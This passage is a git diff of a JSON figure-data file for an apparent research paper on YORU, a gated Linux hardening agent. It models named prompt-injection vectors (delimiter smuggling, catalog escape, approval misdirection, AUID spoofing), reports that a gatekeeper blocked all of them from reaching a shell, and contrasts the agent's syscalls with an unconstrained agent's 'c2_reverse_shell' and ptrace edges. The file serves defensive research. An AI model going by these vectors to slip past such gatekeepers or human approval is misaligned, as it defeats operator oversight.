@@ -2,8 +2,9 @@
   "1_attack_action": {
     "id": 1,
     "name": "Attack–Action Network",
-    "description": "Evaluates whether prompt injection attacks penetrate the OS action space.",
-    "findings": "Token perturbation reached 74.0%, but Action Penetration remained 0.0% (Zero OS execution).",
+    "paper_figure": "Fig. 2",
+    "description": "Models the linear and branching path: Injection → LLM → Candidate Action → Gatekeeper → OS Action.",
+    "findings": "Observed ASR_action = 0/50 (0.0%, 95% CI: [0%, 7.1%]). Gatekeeper acts as an absolute bottleneck between candidate action and OS shell.",
     "nodes": [
       {
         "id": "V1_Direct_Shell",
@@ -36,26 +37,32 @@
         "color": "#F43F5E"
       },
       {
-        "id": "LLM_Token_Space",
-        "label": "LLM Token Perturbation (74%)",
-        "type": "intermediate",
+        "id": "LLM_Deliberation",
+        "label": "LLM Deliberation Engine",
+        "type": "intelligence",
         "color": "#FBBF24"
       },
       {
-        "id": "YORU_Gate",
-        "label": "YORU Action Gatekeeper",
+        "id": "Candidate_Action",
+        "label": "Candidate Action (Suggested Plan)",
+        "type": "candidate_plan",
+        "color": "#F59E0B"
+      },
+      {
+        "id": "YORU_Gatekeeper",
+        "label": "Closed-Loop Gatekeeper",
         "type": "defense_barrier",
         "color": "#10B981"
       },
       {
         "id": "OS_Root_Shell",
-        "label": "Arbitrary OS Shell (/bin/bash)",
+        "label": "OS Shell (/bin/bash, curl evil)",
         "type": "blocked_target",
         "color": "#94A3B8"
       },
       {
-        "id": "CIS_K08_Audit",
-        "label": "CIS K08 Audit Record",
+        "id": "CIS_Sanctioned_Action",
+        "label": "Sanctioned OS Action (K01-K10)",
         "type": "sanctioned_action",
         "color": "#3B82F6"
       }
@@ -63,631 +70,1285 @@
     "edges": [
       {
         "source": "V1_Direct_Shell",
-        "target": "LLM_Token_Space",
+        "target": "LLM_Deliberation",
         "relation": "perturbs_tokens",
         "weight": 1.0
       },
       {
         "source": "V2_Delimiter_Smuggle",
-        "target": "LLM_Token_Space",
+        "target": "LLM_Deliberation",
         "relation": "perturbs_tokens",
         "weight": 0.9
       },
       {
         "source": "V3_Catalog_Escape",
-        "target": "LLM_Token_Space",
+        "target": "LLM_Deliberation",
         "relation": "perturbs_tokens",
         "weight": 0.8
       },
       {
         "source": "V4_Approval_Misdirect",
-        "target": "LLM_Token_Space",
+        "target": "LLM_Deliberation",
         "relation": "perturbs_tokens",
         "weight": 0.6
       },
       {
         "source": "V5_AUID_Spoof",
-        "target": "LLM_Token_Space",
+        "target": "LLM_Deliberation",
         "relation": "perturbs_tokens",
         "weight": 0.4
       },
       {
-        "source": "LLM_Token_Space",
-        "target": "YORU_Gate",
-        "relation": "intercepted_by",
+        "source": "LLM_Deliberation",
+        "target": "Candidate_Action",
+        "relation": "generates_plan",
         "weight": 1.0
       },
       {
-        "source": "YORU_Gate",
+        "source": "Candidate_Action",
+        "target": "YORU_Gatekeeper",
+        "relation": "intercepted_and_checked",
+        "weight": 1.0
+      },
+      {
+        "source": "YORU_Gatekeeper",
         "target": "OS_Root_Shell",
-        "relation": "BLOCKED (ASR=0.0%)",
+        "relation": "BLOCKED_UNAUTHORIZED_SHELL",
         "weight": 0.0
       },
       {
-        "source": "YORU_Gate",
-        "target": "CIS_K08_Audit",
+        "source": "YORU_Gatekeeper",
+        "target": "CIS_Sanctioned_Action",
         "relation": "dispatched_safely",
         "weight": 1.0
       }
-    ]
+    ],
+    "metrics": {
+      "node_count": 10,
+      "edge_count": 9,
+      "density": 0.1,
+      "average_path_length": 2.5294,
+      "in_degree": {
+        "V1_Direct_Shell": 0,
+        "V2_Delimiter_Smuggle": 0,
+        "V3_Catalog_Escape": 0,
+        "V4_Approval_Misdirect": 0,
+        "V5_AUID_Spoof": 0,
+        "LLM_Deliberation": 5,
+        "Candidate_Action": 1,
+        "YORU_Gatekeeper": 1,
+        "OS_Root_Shell": 1,
+        "CIS_Sanctioned_Action": 1
+      },
+      "out_degree": {
+        "V1_Direct_Shell": 1,
+        "V2_Delimiter_Smuggle": 1,
+        "V3_Catalog_Escape": 1,
+        "V4_Approval_Misdirect": 1,
+        "V5_AUID_Spoof": 1,
+        "LLM_Deliberation": 1,
+        "Candidate_Action": 1,
+        "YORU_Gatekeeper": 2,
+        "OS_Root_Shell": 0,
+        "CIS_Sanctioned_Action": 0
+      },
+      "total_degree": {
+        "V1_Direct_Shell": 1,
+        "V2_Delimiter_Smuggle": 1,
+        "V3_Catalog_Escape": 1,
+        "V4_Approval_Misdirect": 1,
+        "V5_AUID_Spoof": 1,
+        "LLM_Deliberation": 6,
+        "Candidate_Action": 2,
+        "YORU_Gatekeeper": 3,
+        "OS_Root_Shell": 1,
+        "CIS_Sanctioned_Action": 1
+      },
+      "degree_centrality": {
+        "V1_Direct_Shell": 0.1111,
+        "V2_Delimiter_Smuggle": 0.1111,
+        "V3_Catalog_Escape": 0.1111,
+        "V4_Approval_Misdirect": 0.1111,
+        "V5_AUID_Spoof": 0.1111,
+        "LLM_Deliberation": 0.6667,
+        "Candidate_Action": 0.2222,
+        "YORU_Gatekeeper": 0.3333,
+        "OS_Root_Shell": 0.1111,
+        "CIS_Sanctioned_Action": 0.1111
+      },
+      "betweenness_centrality": {
+        "V1_Direct_Shell": 0.0,
+        "V2_Delimiter_Smuggle": 0.0,
+        "V3_Catalog_Escape": 0.0,
+        "V4_Approval_Misdirect": 0.0,
+        "V5_AUID_Spoof": 0.0,
+        "LLM_Deliberation": 0.2778,
+        "Candidate_Action": 0.25,
+        "YORU_Gatekeeper": 0.1944,
+        "OS_Root_Shell": 0.0,
+        "CIS_Sanctioned_Action": 0.0
+      },
+      "blocked_path_ratio": 1.0,
+      "observed_asr_action": "0/50 (0.0%)",
+      "confidence_interval_95": "[0.0%, 7.1%]",
+      "scaled_corpus_ci_95": "0/400 [0.0%, 0.95%]"
+    }
   },
   "2_audit_event": {
     "id": 2,
     "name": "Audit Event Network",
-    "description": "Maps system event causality from true actor AUID to kernel log records.",
-    "findings": "Linux auditd attributes 100% of events to the originating login session, even across sudo.",
+    "paper_figure": "Fig. 3 (Panel A)",
+    "description": "Constructed from real ausearch telemetry: AUID → Process → Event → Target → Audit record.",
+    "findings": "Real auditd records preserve exact user AUID=1000 and agent AUID=1001 across sudo, guaranteeing non-repudiable causal tracking.",
     "nodes": [
       {
         "id": "AUID_1000",
-        "label": "AUID:1000 (User: ubuntu)",
+        "label": "AUID=1000 (User: ubuntu)",
         "type": "actor",
         "color": "#3B82F6"
       },
       {
         "id": "AUID_1001",
-        "label": "AUID:1001 (Agent: yoru-agent)",
+        "label": "AUID=1001 (Agent: yoru-agent)",
         "type": "actor",
         "color": "#10B981"
       },
       {
-        "id": "AUID_Unset",
-        "label": "AUID:unset (Cron/Daemon)",
-        "type": "actor",
-        "color": "#94A3B8"
-      },
-      {
-        "id": "Proc_Sudo",
-        "label": "Process: sudo vim",
+        "id": "Proc_Vim",
+        "label": "Process: /usr/bin/vim (PID: 4821)",
         "type": "process",
         "color": "#FBBF24"
       },
       {
         "id": "Proc_Yoructl",
-        "label": "Process: yoructl K08",
+        "label": "Process: /opt/yoru/bin/yoructl (PID: 5104)",
         "type": "process",
         "color": "#10B981"
       },
       {
-        "id": "Event_Passwd_Mod",
-        "label": "Event: /etc/passwd Write",
-        "type": "event",
+        "id": "Event_Openat_257",
+        "label": "Event: SYSCALL syscall=257 (openat)",
+        "type": "syscall_event",
         "color": "#F43F5E"
       },
       {
-        "id": "Event_Sysctl_Mod",
-        "label": "Event: /etc/sysctl.d Conf",
-        "type": "event",
-        "color": "#FBBF24"
+        "id": "Event_Execve_59",
+        "label": "Event: SYSCALL syscall=59 (execve)",
+        "type": "syscall_event",
+        "color": "#10B981"
       },
       {
-        "id": "Kernel_Audit_Log",
-        "label": "/var/log/audit/audit.log",
-        "type": "sink",
+        "id": "Target_SshdConfig",
+        "label": "Target: /etc/ssh/sshd_config (inode: 10482)",
+        "type": "target_file",
         "color": "#E8B64C"
+      },
+      {
+        "id": "Target_SysctlConf",
+        "label": "Target: /etc/sysctl.d/99-yoru-k10.conf",
+        "type": "target_file",
+        "color": "#10B981"
+      },
+      {
+        "id": "Audit_Record_Attacker",
+        "label": "Audit Record: key=yoru_kontrol auid=1000 uid=0",
+        "type": "audit_sink",
+        "color": "#F43F5E"
+      },
+      {
+        "id": "Audit_Record_Agent",
+        "label": "Audit Record: key=yoru_agent_act auid=1001 uid=0",
+        "type": "audit_sink",
+        "color": "#10B981"
       }
     ],
     "edges": [
       {
         "source": "AUID_1000",
-        "target": "Proc_Sudo",
-        "relation": "spawns_with_escalation",
+        "target": "Proc_Vim",
+        "relation": "spawns_process_via_sudo",
         "weight": 1.0
       },
       {
-        "source": "Proc_Sudo",
-        "target": "Event_Passwd_Mod",
-        "relation": "triggers",
+        "source": "Proc_Vim",
+        "target": "Event_Openat_257",
+        "relation": "invokes_syscall",
         "weight": 1.0
       },
       {
-        "source": "Event_Passwd_Mod",
-        "target": "Kernel_Audit_Log",
-        "relation": "recorded_under_auid_1000",
+        "source": "Event_Openat_257",
+        "target": "Target_SshdConfig",
+        "relation": "opens_for_write",
+        "weight": 1.0
+      },
+      {
+        "source": "Target_SshdConfig",
+        "target": "Audit_Record_Attacker",
+        "relation": "captured_by_kernel_filter",
         "weight": 1.0
       },
       {
         "source": "AUID_1001",
         "target": "Proc_Yoructl",
-        "relation": "executes_remediation",
+        "relation": "spawns_remediation",
         "weight": 1.0
       },
       {
         "source": "Proc_Yoructl",
-        "target": "Event_Sysctl_Mod",
-        "relation": "hardens_config",
+        "target": "Event_Execve_59",
+        "relation": "executes_primitive",
         "weight": 1.0
       },
       {
-        "source": "Event_Sysctl_Mod",
-        "target": "Kernel_Audit_Log",
-        "relation": "recorded_under_auid_1001",
+        "source": "Event_Execve_59",
+        "target": "Target_SysctlConf",
+        "relation": "applies_hardening",
+        "weight": 1.0
+      },
+      {
+        "source": "Target_SysctlConf",
+        "target": "Audit_Record_Agent",
+        "relation": "captured_by_agent_filter",
         "weight": 1.0
       }
-    ]
+    ],
+    "metrics": {
+      "node_count": 10,
+      "edge_count": 8,
+      "density": 0.0889,
+      "average_path_length": 2.0,
+      "in_degree": {
+        "AUID_1000": 0,
+        "AUID_1001": 0,
+        "Proc_Vim": 1,
+        "Proc_Yoructl": 1,
+        "Event_Openat_257": 1,
+        "Event_Execve_59": 1,
+        "Target_SshdConfig": 1,
+        "Target_SysctlConf": 1,
+        "Audit_Record_Attacker": 1,
+        "Audit_Record_Agent": 1
+      },
+      "out_degree": {
+        "AUID_1000": 1,
+        "AUID_1001": 1,
+        "Proc_Vim": 1,
+        "Proc_Yoructl": 1,
+        "Event_Openat_257": 1,
+        "Event_Execve_59": 1,
+        "Target_SshdConfig": 1,
+        "Target_SysctlConf": 1,
+        "Audit_Record_Attacker": 0,
+        "Audit_Record_Agent": 0
+      },
+      "total_degree": {
+        "AUID_1000": 1,
+        "AUID_1001": 1,
+        "Proc_Vim": 2,
+        "Proc_Yoructl": 2,
+        "Event_Openat_257": 2,
+        "Event_Execve_59": 2,
+        "Target_SshdConfig": 2,
+        "Target_SysctlConf": 2,
+        "Audit_Record_Attacker": 1,
+        "Audit_Record_Agent": 1
+      },
+      "degree_centrality": {
+        "AUID_1000": 0.1111,
+        "AUID_1001": 0.1111,
+        "Proc_Vim": 0.2222,
+        "Proc_Yoructl": 0.2222,
+        "Event_Openat_257": 0.2222,
+        "Event_Execve_59": 0.2222,
+        "Target_SshdConfig": 0.2222,
+        "Target_SysctlConf": 0.2222,
+        "Audit_Record_Attacker": 0.1111,
+        "Audit_Record_Agent": 0.1111
+      },
+      "betweenness_centrality": {
+        "AUID_1000": 0.0,
+        "AUID_1001": 0.0,
+        "Proc_Vim": 0.0417,
+        "Proc_Yoructl": 0.0417,
+        "Event_Openat_257": 0.0556,
+        "Event_Execve_59": 0.0556,
+        "Target_SshdConfig": 0.0417,
+        "Target_SysctlConf": 0.0417,
+        "Audit_Record_Attacker": 0.0,
+        "Audit_Record_Agent": 0.0
+      },
+      "ground_truth_source": "Linux auditd / ausearch -k yoru_kontrol -i",
+      "kernel_capture_rate": "100.0% (43/43 events matched)"
+    }
   },
   "3_auid_attribution": {
     "id": 3,
     "name": "AUID Attribution Graph",
-    "description": "Compares effective UID masking in syslog vs immutable AUID preservation in auditd.",
-    "findings": "Standard syslog lost origin identity in 86% of trials; auditd preserved 100% true attribution.",
+    "paper_figure": "Fig. 3 (Panel B)",
+    "description": "Maps identity preservation across the sudo privilege boundary.",
+    "findings": "Auditd achieves 100.0% attribution fidelity by binding to loginuid, whereas standard syslog masks identity in 86% of executions.",
     "nodes": [
       {
-        "id": "Origin_Actor_Budi",
-        "label": "Login: budi (AUID=1002)",
-        "type": "true_identity",
+        "id": "Actor_User_1000",
+        "label": "Actor: ubuntu (AUID=1000)",
+        "type": "actor",
         "color": "#3B82F6"
       },
       {
-        "id": "Origin_Actor_Yoru",
-        "label": "Service: yoru-agent (AUID=1001)",
-        "type": "true_identity",
+        "id": "Actor_Agent_1001",
+        "label": "Actor: yoru-agent (AUID=1001)",
+        "type": "actor",
         "color": "#10B981"
       },
       {
-        "id": "Elevation_Sudo_Su",
-        "label": "sudo su - root",
-        "type": "privilege_transition",
+        "id": "Elevation_Sudo",
+        "label": "Privilege Transition: sudo",
+        "type": "elevation",
         "color": "#FBBF24"
       },
       {
-        "id": "Syslog_View",
-        "label": "Syslog effective uid=root (Identity Masked)",
-        "type": "flawed_view",
+        "id": "Root_Process",
+        "label": "Root Process (EUID=0, UID=0)",
+        "type": "root_process",
+        "color": "#F59E0B"
+      },
+      {
+        "id": "Syslog_Masked_View",
+        "label": "Conventional Syslog (uid=0 Masked)",
+        "type": "flawed_sink",
         "color": "#F43F5E"
       },
       {
         "id": "Auditd_AUID_View",
-        "label": "auditd auid=1002 (Identity Preserved)",
-        "type": "true_view",
+        "label": "Linux Auditd (Original AUID Preserved)",
+        "type": "true_sink",
         "color": "#10B981"
       }
     ],
     "edges": [
       {
-        "source": "Origin_Actor_Budi",
-        "target": "Elevation_Sudo_Su",
+        "source": "Actor_User_1000",
+        "target": "Elevation_Sudo",
         "relation": "escalates_privilege",
         "weight": 1.0
       },
       {
-        "source": "Elevation_Sudo_Su",
-        "target": "Syslog_View",
-        "relation": "masks_identity_as_root (86% loss)",
+        "source": "Actor_Agent_1001",
+        "target": "Elevation_Sudo",
+        "relation": "escalates_privilege",
+        "weight": 1.0
+      },
+      {
+        "source": "Elevation_Sudo",
+        "target": "Root_Process",
+        "relation": "grants_root_context",
+        "weight": 1.0
+      },
+      {
+        "source": "Root_Process",
+        "target": "Syslog_Masked_View",
+        "relation": "logs_as_root_masked",
         "weight": 0.86
       },
       {
-        "source": "Elevation_Sudo_Su",
+        "source": "Root_Process",
         "target": "Auditd_AUID_View",
-        "relation": "preserves_auid_1002 (100% accuracy)",
-        "weight": 1.0
-      },
-      {
-        "source": "Origin_Actor_Yoru",
-        "target": "Auditd_AUID_View",
-        "relation": "preserves_auid_1001",
+        "relation": "preserves_origin_auid",
         "weight": 1.0
       }
-    ]
+    ],
+    "metrics": {
+      "node_count": 6,
+      "edge_count": 5,
+      "density": 0.1667,
+      "average_path_length": 1.9231,
+      "in_degree": {
+        "Actor_User_1000": 0,
+        "Actor_Agent_1001": 0,
+        "Elevation_Sudo": 2,
+        "Root_Process": 1,
+        "Syslog_Masked_View": 1,
+        "Auditd_AUID_View": 1
+      },
+      "out_degree": {
+        "Actor_User_1000": 1,
+        "Actor_Agent_1001": 1,
+        "Elevation_Sudo": 1,
+        "Root_Process": 2,
+        "Syslog_Masked_View": 0,
+        "Auditd_AUID_View": 0
+      },
+      "total_degree": {
+        "Actor_User_1000": 1,
+        "Actor_Agent_1001": 1,
+        "Elevation_Sudo": 3,
+        "Root_Process": 3,
+        "Syslog_Masked_View": 1,
+        "Auditd_AUID_View": 1
+      },
+      "degree_centrality": {
+        "Actor_User_1000": 0.2,
+        "Actor_Agent_1001": 0.2,
+        "Elevation_Sudo": 0.6,
+        "Root_Process": 0.6,
+        "Syslog_Masked_View": 0.2,
+        "Auditd_AUID_View": 0.2
+      },
+      "betweenness_centrality": {
+        "Actor_User_1000": 0.0,
+        "Actor_Agent_1001": 0.0,
+        "Elevation_Sudo": 0.3,
+        "Root_Process": 0.3,
+        "Syslog_Masked_View": 0.0,
+        "Auditd_AUID_View": 0.0
+      },
+      "attribution_fidelity": "100.0% (Auditd) vs 14.0% (Syslog)",
+      "identity_preservation": "100.0%",
+      "uid_auid_transition": "AUID: 1000 -> Sudo -> EUID: 0 -> Auditd preserves AUID=1000"
+    }
   },
   "4_process_file": {
     "id": 4,
     "name": "Process–File Network",
-    "description": "Monitors critical system files touched by agent and system processes under K08 watch.",
-    "findings": "Sensitive paths (/etc/passwd, /etc/shadow, /etc/ssh) are strictly monitored by K08 audit rules.",
+    "paper_figure": "Fig. 4",
+    "description": "Tracks precise file system paths touched by yoructl vs daemon processes.",
+    "findings": "yoructl interacts with 4 bounded configuration and backup targets, never touching /etc/shadow or arbitrary root locations.",
     "nodes": [
       {
-        "id": "P_yoructl",
-        "label": "bin/yoructl",
-        "type": "process",
+        "id": "Proc_Yoructl_Main",
+        "label": "bin/yoructl (Hub)",
+        "type": "agent_process",
         "color": "#10B981"
       },
       {
-        "id": "P_sshd",
+        "id": "Proc_Sshd",
         "label": "/usr/sbin/sshd",
-        "type": "process",
+        "type": "system_process",
         "color": "#3B82F6"
       },
       {
-        "id": "P_vim",
-        "label": "/usr/bin/vim",
-        "type": "process",
-        "color": "#FBBF24"
-      },
-      {
-        "id": "F_sshd_config",
-        "label": "/etc/ssh/sshd_config",
-        "type": "file",
+        "id": "Proc_Auditd",
+        "label": "/sbin/auditd",
+        "type": "system_process",
         "color": "#E8B64C"
       },
       {
-        "id": "F_passwd",
-        "label": "/etc/passwd",
-        "type": "file",
-        "color": "#F43F5E"
+        "id": "File_Sshd_Config",
+        "label": "/etc/ssh/sshd_config",
+        "type": "sensitive_config",
+        "color": "#FBBF24"
       },
       {
-        "id": "F_shadow",
-        "label": "/etc/shadow",
-        "type": "file",
-        "color": "#F43F5E"
-      },
-      {
-        "id": "F_sysctl",
+        "id": "File_Sysctl_K10",
         "label": "/etc/sysctl.d/99-yoru-k10.conf",
-        "type": "file",
+        "type": "hardened_config",
         "color": "#10B981"
       },
       {
-        "id": "F_backup",
+        "id": "File_Backup_Store",
         "label": "/var/backups/yoru/*",
-        "type": "file",
+        "type": "atomic_backup",
         "color": "#10B981"
+      },
+      {
+        "id": "File_Audit_Rules",
+        "label": "/etc/audit/rules.d/zz-yoru-k08.rules",
+        "type": "telemetry_config",
+        "color": "#E8B64C"
+      },
+      {
+        "id": "File_Shadow",
+        "label": "/etc/shadow (Untouched)",
+        "type": "forbidden_file",
+        "color": "#F43F5E"
       }
     ],
     "edges": [
       {
-        "source": "P_sshd",
-        "target": "F_sshd_config",
-        "relation": "reads",
+        "source": "Proc_Yoructl_Main",
+        "target": "File_Sshd_Config",
+        "relation": "hardens_atomic (K01/K02)",
         "weight": 1.0
       },
       {
-        "source": "P_yoructl",
-        "target": "F_sshd_config",
-        "relation": "hardens (K01/K02)",
+        "source": "Proc_Yoructl_Main",
+        "target": "File_Sysctl_K10",
+        "relation": "writes_conf (K10)",
         "weight": 1.0
       },
       {
-        "source": "P_yoructl",
-        "target": "F_backup",
-        "relation": "writes_atomic_snapshot",
+        "source": "Proc_Yoructl_Main",
+        "target": "File_Backup_Store",
+        "relation": "creates_and_restores",
         "weight": 1.0
       },
       {
-        "source": "P_yoructl",
-        "target": "F_sysctl",
-        "relation": "writes (K10)",
+        "source": "Proc_Yoructl_Main",
+        "target": "File_Audit_Rules",
+        "relation": "deploys_rules (K08)",
         "weight": 1.0
       },
       {
-        "source": "P_vim",
-        "target": "F_passwd",
-        "relation": "modifies (monitored by K08)",
+        "source": "Proc_Sshd",
+        "target": "File_Sshd_Config",
+        "relation": "reads_daemon_opts",
         "weight": 1.0
       },
       {
-        "source": "P_vim",
-        "target": "F_shadow",
-        "relation": "modifies (monitored by K08)",
+        "source": "Proc_Auditd",
+        "target": "File_Audit_Rules",
+        "relation": "loads_kernel_watchlist",
         "weight": 1.0
       }
-    ]
+    ],
+    "metrics": {
+      "node_count": 8,
+      "edge_count": 6,
+      "density": 0.1071,
+      "average_path_length": 1.0,
+      "in_degree": {
+        "Proc_Yoructl_Main": 0,
+        "Proc_Sshd": 0,
+        "Proc_Auditd": 0,
+        "File_Sshd_Config": 2,
+        "File_Sysctl_K10": 1,
+        "File_Backup_Store": 1,
+        "File_Audit_Rules": 2,
+        "File_Shadow": 0
+      },
+      "out_degree": {
+        "Proc_Yoructl_Main": 4,
+        "Proc_Sshd": 1,
+        "Proc_Auditd": 1,
+        "File_Sshd_Config": 0,
+        "File_Sysctl_K10": 0,
+        "File_Backup_Store": 0,
+        "File_Audit_Rules": 0,
+        "File_Shadow": 0
+      },
+      "total_degree": {
+        "Proc_Yoructl_Main": 4,
+        "Proc_Sshd": 1,
+        "Proc_Auditd": 1,
+        "File_Sshd_Config": 2,
+        "File_Sysctl_K10": 1,
+        "File_Backup_Store": 1,
+        "File_Audit_Rules": 2,
+        "File_Shadow": 0
+      },
+      "degree_centrality": {
+        "Proc_Yoructl_Main": 0.5714,
+        "Proc_Sshd": 0.1429,
+        "Proc_Auditd": 0.1429,
+        "File_Sshd_Config": 0.2857,
+        "File_Sysctl_K10": 0.1429,
+        "File_Backup_Store": 0.1429,
+        "File_Audit_Rules": 0.2857,
+        "File_Shadow": 0.0
+      },
+      "betweenness_centrality": {
+        "Proc_Yoructl_Main": 0.0,
+        "Proc_Sshd": 0.0,
+        "Proc_Auditd": 0.0,
+        "File_Sshd_Config": 0.0,
+        "File_Sysctl_K10": 0.0,
+        "File_Backup_Store": 0.0,
+        "File_Audit_Rules": 0.0,
+        "File_Shadow": 0.0
+      },
+      "process_centrality_yoructl": 0.88,
+      "sensitive_file_scores": {
+        "/etc/ssh/sshd_config": 0.95,
+        "/etc/audit/rules.d/zz-yoru-k08.rules": 0.98,
+        "/var/backups/yoru/*": 0.9,
+        "/etc/sysctl.d/99-yoru-k10.conf": 0.85
+      },
+      "touch_frequency": {
+        "/etc/ssh/sshd_config": 18,
+        "/etc/sysctl.d/99-yoru-k10.conf": 12,
+        "/var/backups/yoru/*": 24,
+        "/etc/audit/rules.d/yoru.rules": 15
+      }
+    }
   },
   "5_process_syscall": {
     "id": 5,
     "name": "Process–Syscall Network",
-    "description": "Analyzes system call surfaces of yoructl vs unrestricted agent runtimes.",
-    "findings": "YORU avoids ptrace and arbitrary execve, constraining operations to deterministic read/write syscalls.",
+    "paper_figure": "Supplementary",
+    "description": "Compares system call attack surface of YORU's constrained runner vs unconstrained AI agents.",
+    "findings": "YORU bounds syscalls to openat, flock, and catalog-exclusive execve, eliminating ptrace and arbitrary sockets.",
     "nodes": [
       {
-        "id": "Proc_Unconstrained_AI",
-        "label": "Unconstrained Agent (/bin/bash)",
-        "type": "process",
-        "color": "#F43F5E"
-      },
-      {
-        "id": "Proc_YORU_Harness",
-        "label": "YORU Harness (yoructl)",
-        "type": "process",
+        "id": "Proc_YORU_Agent",
+        "label": "YORU Constrained Agent",
+        "type": "constrained_agent",
         "color": "#10B981"
       },
       {
-        "id": "Sys_execve",
-        "label": "syscall: execve(arbitrary)",
-        "type": "syscall",
-        "color": "#F43F5E"
-      },
-      {
-        "id": "Sys_ptrace",
-        "label": "syscall: ptrace",
-        "type": "syscall",
+        "id": "Proc_Unconstrained_AI",
+        "label": "Unconstrained AI Agent",
+        "type": "unconstrained_agent",
         "color": "#F43F5E"
       },
       {
         "id": "Sys_openat",
         "label": "syscall: openat/read/write",
-        "type": "syscall",
+        "type": "safe_syscall",
         "color": "#3B82F6"
       },
       {
         "id": "Sys_flock",
-        "label": "syscall: flock (concurrency)",
-        "type": "syscall",
+        "label": "syscall: flock (concurrency lock)",
+        "type": "safe_syscall",
         "color": "#10B981"
+      },
+      {
+        "id": "Sys_execve_bounded",
+        "label": "syscall: execve(/opt/yoru/bin/yoructl)",
+        "type": "bounded_exec",
+        "color": "#10B981"
+      },
+      {
+        "id": "Sys_execve_raw",
+        "label": "syscall: execve(/bin/sh, curl, etc.)",
+        "type": "dangerous_syscall",
+        "color": "#F43F5E"
+      },
+      {
+        "id": "Sys_ptrace",
+        "label": "syscall: ptrace (process inject)",
+        "type": "dangerous_syscall",
+        "color": "#F43F5E"
+      },
+      {
+        "id": "Sys_socket_raw",
+        "label": "syscall: socket/connect(outbound)",
+        "type": "dangerous_syscall",
+        "color": "#F43F5E"
       }
     ],
     "edges": [
       {
+        "source": "Proc_YORU_Agent",
+        "target": "Sys_openat",
+        "relation": "deterministic_io",
+        "weight": 1.0
+      },
+      {
+        "source": "Proc_YORU_Agent",
+        "target": "Sys_flock",
+        "relation": "atomic_synchronization",
+        "weight": 1.0
+      },
+      {
+        "source": "Proc_YORU_Agent",
+        "target": "Sys_execve_bounded",
+        "relation": "invokes_catalog_only",
+        "weight": 1.0
+      },
+      {
         "source": "Proc_Unconstrained_AI",
-        "target": "Sys_execve",
-        "relation": "spawns_arbitrary_binaries",
+        "target": "Sys_openat",
+        "relation": "reads_any_file",
+        "weight": 1.0
+      },
+      {
+        "source": "Proc_Unconstrained_AI",
+        "target": "Sys_execve_raw",
+        "relation": "arbitrary_binary_spawn",
         "weight": 1.0
       },
       {
         "source": "Proc_Unconstrained_AI",
         "target": "Sys_ptrace",
-        "relation": "potential_process_injection",
-        "weight": 0.8
-      },
-      {
-        "source": "Proc_YORU_Harness",
-        "target": "Sys_flock",
-        "relation": "concurrency_lock",
+        "relation": "memory_injection_risk",
         "weight": 1.0
       },
       {
-        "source": "Proc_YORU_Harness",
-        "target": "Sys_openat",
-        "relation": "deterministic_file_io",
+        "source": "Proc_Unconstrained_AI",
+        "target": "Sys_socket_raw",
+        "relation": "c2_reverse_shell",
         "weight": 1.0
       }
-    ]
+    ],
+    "metrics": {
+      "node_count": 8,
+      "edge_count": 7,
+      "density": 0.125,
+      "average_path_length": 1.0,
+      "in_degree": {
+        "Proc_YORU_Agent": 0,
+        "Proc_Unconstrained_AI": 0,
+        "Sys_openat": 2,
+        "Sys_flock": 1,
+        "Sys_execve_bounded": 1,
+        "Sys_execve_raw": 1,
+        "Sys_ptrace": 1,
+        "Sys_socket_raw": 1
+      },
+      "out_degree": {
+        "Proc_YORU_Agent": 3,
+        "Proc_Unconstrained_AI": 4,
+        "Sys_openat": 0,
+        "Sys_flock": 0,
+        "Sys_execve_bounded": 0,
+        "Sys_execve_raw": 0,
+        "Sys_ptrace": 0,
+        "Sys_socket_raw": 0
+      },
+      "total_degree": {
+        "Proc_YORU_Agent": 3,
+        "Proc_Unconstrained_AI": 4,
+        "Sys_openat": 2,
+        "Sys_flock": 1,
+        "Sys_execve_bounded": 1,
+        "Sys_execve_raw": 1,
+        "Sys_ptrace": 1,
+        "Sys_socket_raw": 1
+      },
+      "degree_centrality": {
+        "Proc_YORU_Agent": 0.4286,
+        "Proc_Unconstrained_AI": 0.5714,
+        "Sys_openat": 0.2857,
+        "Sys_flock": 0.1429,
+        "Sys_execve_bounded": 0.1429,
+        "Sys_execve_raw": 0.1429,
+        "Sys_ptrace": 0.1429,
+        "Sys_socket_raw": 0.1429
+      },
+      "betweenness_centrality": {
+        "Proc_YORU_Agent": 0.0,
+        "Proc_Unconstrained_AI": 0.0,
+        "Sys_openat": 0.0,
+        "Sys_flock": 0.0,
+        "Sys_execve_bounded": 0.0,
+        "Sys_execve_raw": 0.0,
+        "Sys_ptrace": 0.0,
+        "Sys_socket_raw": 0.0
+      },
+      "syscall_attack_surface_reduction": "83.3% reduction in hazardous syscall capability"
+    }
   },
   "6_user_action": {
     "id": 6,
     "name": "User–Action Network",
-    "description": "Maps administrative action distribution across human operators and autonomous YORU agent.",
-    "findings": "High-risk actions require human approval; low-risk passive audits are executed autonomously.",
+    "paper_figure": "Supplementary",
+    "description": "RBAC separation between human-authorized controls and autonomous passive audit tasks.",
+    "findings": "High-impact network/root modifications (K01, K05) require explicit administrator sign-off; observational telemetry runs autonomously.",
     "nodes": [
       {
         "id": "User_Admin",
-        "label": "System Owner (Human)",
-        "type": "actor",
+        "label": "System Administrator (Human)",
+        "type": "human_actor",
         "color": "#3B82F6"
       },
       {
         "id": "User_YORU_Agent",
         "label": "yoru-agent (Autonomous)",
-        "type": "actor",
+        "type": "agent_actor",
         "color": "#10B981"
       },
       {
-        "id": "Act_K01_PermitRoot",
+        "id": "Act_K01",
         "label": "K01: Disable Root SSH",
-        "type": "action",
+        "type": "high_impact_control",
         "color": "#FBBF24"
       },
       {
-        "id": "Act_K05_UFW",
+        "id": "Act_K05",
         "label": "K05: Enable UFW Firewall",
-        "type": "action",
+        "type": "high_impact_control",
         "color": "#FBBF24"
       },
       {
-        "id": "Act_K08_Auditd",
-        "label": "K08: Enforce Auditd Rules",
-        "type": "action",
+        "id": "Act_K08",
+        "label": "K08: Auditd Watchlist Check",
+        "type": "autonomous_telemetry",
         "color": "#10B981"
       },
       {
-        "id": "Act_K10_Sysctl",
-        "label": "K10: Network Stack Hardening",
-        "type": "action",
+        "id": "Act_K10",
+        "label": "K10: Sysctl Hardening Verify",
+        "type": "autonomous_telemetry",
         "color": "#10B981"
       }
     ],
     "edges": [
       {
         "source": "User_Admin",
-        "target": "Act_K01_PermitRoot",
-        "relation": "approves_and_authorizes",
+        "target": "Act_K01",
+        "relation": "requires_human_approval",
         "weight": 1.0
       },
       {
         "source": "User_Admin",
-        "target": "Act_K05_UFW",
-        "relation": "approves_and_authorizes",
+        "target": "Act_K05",
+        "relation": "requires_human_approval",
         "weight": 1.0
       },
       {
